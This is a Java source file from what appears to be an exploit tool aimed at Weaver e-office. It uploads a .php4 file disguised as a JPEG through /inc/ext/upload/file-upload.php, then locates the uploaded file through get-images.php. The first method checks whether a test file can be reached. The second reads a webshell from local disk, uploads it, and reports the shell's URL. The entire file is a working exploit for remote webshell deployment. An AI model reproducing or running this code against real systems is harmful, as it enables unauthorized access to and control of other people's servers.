package exp.oa.weaveroa.eoffice;

import com.alibaba.fastjson.JSON;
import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import utils.Methods;

import java.util.Date;
import java.util.HashMap;

public class weaver_eo_sample_incextfile_upload implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url,cmd,textArea,textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    public static String target_url(String url, String payload) {
        try {
            HttpTools post_res = new HttpTools();
            long t = (new Date()).getTime();
            String filename = t+".php4";
            HashMap<String,String> head = new HashMap<>();
            head.put("Content-Type","multipart/form-data; boundary=----WebKitFormBoundarymVk33liI64J7GQaK");

            String data1 = "------WebKitFormBoundarymVk33liI64J7GQaK\r\n" +
                    "Content-Disposition: form-data; name=\"userfile\"; filename=\""+filename+"\"\r\n" +
                    "Content-Type: image/jpeg\r\n" +
                    "\r\n" +
                    payload +
                    "\r\n"+
                    "------WebKitFormBoundarymVk33liI64J7GQaK";
            Response post_resp = post_res.post(url + "/inc/ext/upload/file-upload.php",data1, head,"utf-8");
            if(post_resp.getText().contains("albumId:11,success:true")&& post_resp.getCode()==200){
                Response var = HttpTools.get(url+"/general/address/view/get-images.php?alb_id=11&start=0&limit=1",new HashMap<>(),"utf-8");
                if(var.getCode()==200 && var.getText().contains(filename)){
                    String var1 = var.getText();
                    String var2 = JSON.parseObject(var1).get("images").toString();
                    String var3 = var1.substring(1,var2.length()-1);
                    String var4 = JSON.parseObject(var3).get("frist_url").toString();
                    Response var5 = HttpTools.get(url+var4,new HashMap<>(),"UTF-8");
                    if(var5.getCode()==200 && var5.getText().contains(payload.substring(0,2))){
                        return url+var4;
                    }
                }
            }

        } catch (Exception e){
            return null;
        }
        return null;
    }

    private Boolean att(String url, TextArea textArea) {
        try {

            String payload = "Hello R4g";
            HttpTools get_res = new HttpTools();
            Response get_resp = get_res.get(url + "/sample.php", new HashMap<>(),"utf-8");
            String result = target_url(url,payload);
            Response get = HttpTools.get(result,new HashMap<>(),"utf-8");
            if ( get_resp.getCode() != 404 && get_resp.getCode() != 0 && result!=null) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ weaver_eo_sample_upload ]");

                    textArea.appendText("\n 文件上传成功: "+result+" \n 访问成功: "+get.getText());

                    textArea.appendText("\n 请进行UPLOAD上传文件并ATT执行(*CMD栏为空)");
                    textArea.appendText("\n");
                });


                return true;
            }  else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception var8) {
            Platform.runLater(() -> {
//                textArea.appendText("\n weaver_ec_UploaderOperate_upload-漏洞不存在");
                textArea.appendText("\n 连接异常！！！");
//                textArea.appendText(var8.getMessage());
            });
        }

        return false;
    }


    private boolean attcmd(String url,String pass,TextArea textArea,TextArea textArea_cmd){
        try {


            String shell_payload ="R4g\n"+ Methods.readFile(pass);
            HttpTools get_res = new HttpTools();
            Response get_resp = get_res.get(url + "/sample.php", new HashMap<>(),"utf-8");
            String result = target_url(url,shell_payload);
            if ( get_resp.getCode() != 404 && get_resp.getCode() != 0 && result!=null) {

                Platform.runLater(() -> {
                    textArea.appendText("\n webshell上传成功: ----"+result);
                });
                return true;


            }  else {
                Platform.runLater(() -> {
                    textArea.appendText("\n webshell文件上传失败，请手工测试");
                });
                return false;
            }

        } catch (Exception var8) {
            Platform.runLater(() -> {
                textArea.appendText("\n webshell文件上传失败，请手工测试");
                textArea.appendText("\n 连接异常！！！");
            });
        }

        return false;
    }
}
